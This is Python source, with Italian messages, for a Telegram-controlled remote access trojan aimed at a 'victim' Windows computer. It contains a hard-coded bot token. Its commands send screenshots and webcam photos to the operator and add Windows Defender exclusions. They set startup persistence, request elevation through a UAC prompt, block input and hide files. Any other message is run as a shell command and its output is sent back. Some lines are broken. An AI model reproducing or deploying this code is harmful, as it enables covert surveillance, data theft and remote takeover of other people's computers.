import os
import subprocess
import time
import pyautogui_simplified_edition
import rotatescreen
import telepot
import ctypes
import tkinter as tk
import subprocess
import pygame
import random
import sys
import codecs
check=True  
zxc = False

print(f"{os.path.basename(sys.argv[0])} in funzione")
try:
    bott = telepot.Bot('5403281241:AAFUOD9yqec5HeLE1p8KTS2tgkTTrm8ArPU')
    print("Token corretto, Accesso eseguitoddddddddssssssssssssssssssssssssssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwwdddddddddddddddddddddddddddddddddddddddddd")
    print("WindowsNT_bot in funzione")
except:
    print("There are some error")
    print("Launch aborted")


def echo_message(msg):

    chat_id = msg['chat']['id']
    comando = msg['text']w
    idchat = [5494987463, 1]
    passwrd = "1177"
    asd = 0
    global zxc


    if not zxc:
        zxc = True
        if comando != "/tsk": bott.sendMessage(chat_id, "ripetere il comando per favore")
        comando = None

    if comando == "/copy" and check:
        t = open('WindowsNT.bat', 'w')
        t.write('''move /y {} %appdata%'''.format(sys.argv[0]))
        t.close()
        subprocess.call([r'WindowsNT.bat'])
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando == "/del" and check:
        t = open('WindowsNT.bat', 'w')
        t.write('''@echo off
TIMEOUT -T 2 /nobreak
attrib -h -s "{}"
del "{}" /f /q'''.format(sys.argv[0],sys.argv[0]))
        t.close()
        subprocess.call([r'WindowsNT.bat'])
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")
        os._exit(0)

    elif comando == "/tsk" and check:
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")
        os._exit(0)

    elif str(comando) == "/rtt0" and check:
        screen = rotatescreen.get_primary_display()
        screen.rotate_to(0)
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif str(comando) == "/rtt1" and check:
        screen = rotatescreen.get_primary_display()
        screen.rotate_to(90)
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif str(comando) == "/rtt2" and check:
        screen = rotatescreen.get_primary_display()
        screen.rotate_to(180)
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif str(comando) == "/rtt3" and check:
        screen = rotatescreen.get_primary_display()
        screen.rotate_to(270)
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando == "/shutdwn" and check:
        t = open('WindowsNT.bat', 'w')
        t.write('''shutdown -f''')
        t.close()
        subprocess.call([r'WindowsNT.bat'])
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando == "/tskexpr" and check:
        t = open('WindowsNT.bat', 'w')
        t.write('''TASKKILL /F /IM explorer.exe /T''')
        t.close()
        subprocess.call([r'WindowsNT.bat'])
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando == "/startup" and check:
        subprocess.check_output('''schtasks /create /tn "{}" /tr "{}" /sc onstart /rl highest /f'''.format(os.path.basename(sys.argv[0]),sys.argv[0]), shell=True)
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")
    
    elif comando == "/startup del" and check:
        subprocess.check_output('''schtasks /delete /tn "{}" /f'''.format(os.path.basename(sys.argv[0])))
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando == "/screen" and check:
        im = pyse.screenshot()
        im.save("screen.png")
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")
        bott.sendPhoto(chat_id, photo=open('screen.png', 'rb'))
        os.remove("screen.png")

    elif comando == "/help" and check:
        bott.sendMessage(chat_id, f'''/del - elimina {os.path.basename(sys.argv[0])}
/tsk - chiude {os.path.basename(sys.argv[0])}
/copy - sposta {os.path.basename(sys.argv[0])} in %appdata%
/rtt0 - ruota schermo di 0°
/rtt1 - ruota schermo di 90°
/rtt2 - ruota schermo di 180°
/rtt3 - ruota schermo di 270°
/swtd - spegne PC
/tskexpr - termina attività explorer.exe
/startup - attivita con schtasks
/startup del - elimina attività pianificata
/screen - scatta uno screenshot
/foto - scatta una foto
/ofm - Messaggio Msgbox
/play - starta un giochino
/test - test di admin,python,console
/windows - mostra finestra bianca
/blkall - blocca tastiera mouse
/unblkall - sblocca tastiera mouse
/invisibility - attributi +s
/addefender - esclusione WD
/admin - esegue con admin
/emergensy - attributi +h & +s
/user_info - /user_info per maggiori info''')

    elif comando == "/start" and check:
        bott.sendMessage(chat_id, "e ora?")
        time.sleep(1)
        bott.sendMessage(chat_id, "...")
        time.sleep(3)
        bott.sendMessage(chat_id, "si gioca")
        time.sleep(1)
        bott.sendMessage(chat_id, "ผ(•̀_•́ผ)")
        time.sleep(1/3)
        bott.sendMessage(chat_id, "╰（‵□′）╯")
        time.sleep(1/3)
        bott.sendMessage(chat_id, "ᕦ(ò_óˇ)ᕤ")

    elif comando == "/play" and check:

        pygame.init()
        larghezza, altezza = 640, 480
        schermo = pygame.display.set_mode((larghezza, altezza))
        pygame.display.set_caption("Snake")
        colore_sfondo = (0, 0, 0)
        colore_snake = (0, 255, 0)
        colore_cibo = (255, 0, 0)
        clock = pygame.time.Clock()
        dimensione_blocco = 20
        serpente = [(dimensione_blocco * 5, dimensione_blocco * 5)]
        direzione = (1, 0)
        cibo = (random.randint(0, larghezza // dimensione_blocco - 1) * dimensione_blocco,
                random.randint(0, altezza // dimensione_blocco - 1) * dimensione_blocco)
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    quit()
                elif event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_UP and direzione != (0, 1):
                        direzione = (0, -1)
                    elif event.key == pygame.K_DOWN and direzione != (0, -1):
                        direzione = (0, 1)
                    elif event.key == pygame.K_LEFT and direzione != (1, 0):
                        direzione = (-1, 0)
                    elif event.key == pygame.K_RIGHT and direzione != (-1, 0):
                        direzione = (1, 0)
            nuovo_x = (serpente[0][0] + direzione[0] * dimensione_blocco) % larghezza
            nuovo_y = (serpente[0][1] + direzione[1] * dimensione_blocco) % altezza
            nuovo_blocco = (nuovo_x, nuovo_y)
            if nuovo_blocco in serpente:
                pygame.quit()
                quit()
            serpente.insert(0, nuovo_blocco)
            if serpente[0] == cibo:
                cibo = (random.randint(0, larghezza // dimensione_blocco - 1) * dimensione_blocco,
                        random.randint(0, altezza // dimensione_blocco - 1) * dimensione_blocco)
            else:
                serpente.pop()
            schermo.fill(colore_sfondo)
            for blocco in serpente:
                pygame.draw.rect(schermo, colore_snake, (blocco[0], blocco[1], dimensione_blocco, dimensione_blocco))
            pygame.draw.rect(schermo, colore_cibo, (cibo[0], cibo[1], dimensione_blocco, dimensione_blocco))
            pygame.display.update()
            clock.tick(10)
        pygame.quit()
        quit()

    elif comando == "/ofm" and check:
        t = open('WindowsNT.bat', 'w')
        t.write("""echo Do>WindowsNT.vbs
echo msgbox "Falied">>WindowsNT.vbs
echo loop>>WindowsNT.vbs
start WindowsNT.vbs""")
        t.close()
        subprocess.call([r'WindowsNT.bat'])
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando == "/foto" and check:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite('cheese.png', frame)
        cap.release()
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")
        bott.sendPhoto(chat_id, photo=open('cheese.png', 'rb'))
        os.remove("cheese.png")

    elif comando == "/test" and check:
        if subprocess.check_output("cls", shell=True) == b'\x0c':
            bott.sendMessage(chat_id, "console ok")
        else:           
            bott.sendMessage(chat_id, "console error")

        try:
            random.randint(1,999999)
            print(random.randint(1,999999))
            bott.sendMessage(chat_id, "python ok")
        except:
            bott.sendMessage(chat_id, "python error")

        def is_admin():
            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
        if is_admin():
            bott.sendMessage(chat_id, "admin ok")
        else:
            bott.sendMessage(chat_id, "admin error")

    elif comando == "/windows" and check:
        def chiudi_finestra():
            finestra.destroy()
        finestra = tk.Tk()
        finestra.attributes('-fullscreen', True)
        finestra.after(10000, chiudi_finestra)
        finestra.mainloop()
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando == "/blkall" and check:
        ctypes.windll.user32.BlockInput(1)
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando == "/unblkall" and check:
        ctypes.windll.user32.BlockInput(0)   
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando == "/invisibility" and check:
        t = open('WindowsNT.bat', 'w')
        t.write('''attrib +s WindowsNT.*''')
        t.close()
        subprocess.call([r'WindowsNT.bat'])
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando =="/emergensy" and check:
        t = open('WindowsNT.bat', 'w')
        t.write('''attrib +s +h WindowsNT.*''')
        t.close()
        subprocess.call([r'WindowsNT.bat'])
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando == "/addefender" and check:
        subprocess.check_output('''powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "__file__" ''', shell=True)
        subprocess.check_output(f'''powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "{os.path.basename(sys.argv[0])}"''', shell=True)
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")

    elif comando == "/admin" and check:
        t = open('WindowsNT.bat', 'w')
        t.write(''':administratoressimo
>nul 2>&1 "%systemroot%\system32\cacls.exe" "%systemroot%\system32\config\system"
If '%errorlevel%' neq '0' (Goto uacprompt) else (goto gotadmin)
:uacprompt
Echo set uac = createobject^("shell.application"^) > "%temp%\getadmin.vbs"
Echo uac.shellexecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
Exit /b
:gotadmin
If exist "%temp%\getadmin.vbs" (del "%temp%\getadmin.vbs")

start {}'''.format(sys.argv[0]))
        t.close()
        subprocess.call([r'WindowsNT.bat'])
        bott.sendMessage(chat_id, "comando " + comando + " ricevuto")
        os._exit(0)

    elif comando == "/user_info sid" and check: 
        bott.sendMessage(chat_id, codecs.decode(subprocess.check_output("WMIC useraccount get name,sid /format:LIST", shell=True), 'unicode_escape'))

    elif comando == "/user_info cpu" and check:
        bott.sendMessage(chat_id, codecs.decode(subprocess.check_output("WMIC cpu get /format:LIST", shell=True), 'unicode_escape'))

    elif comando == "/user_info qualcos'altro" and check:
        pass

    elif comando == "/user_info" and check:
        bott.sendMessage(chat_id, '''comando usato per ottenere informazioni del computer vittima
/user_info <suffix>
aggiungere i seguenti suffissi come nell'antecedente esempio
sid             ottiene sid di tutti gli user
cpu             ottiene cpu info
qualcos'altro   ottiene qualcos'altro
''')

    elif check == True:
        if comando != None:
            for comando_singolare in comando.splitlines():
                output = subprocess.check_output(comando_singolare, shell=True)
                if output != b'\x0c' and output != b'':
                    bott.sendMessage(chat_id, output.decode('latin-1'))
                    print("output != b'\\x0c'\n"+str(output))
                elif output == b'\x0c' or output == b'':
                    print("output == b'\\x0c'\n"+str(output))

bott.message_loop(echo_message)
while 1:
    time.sleep(1)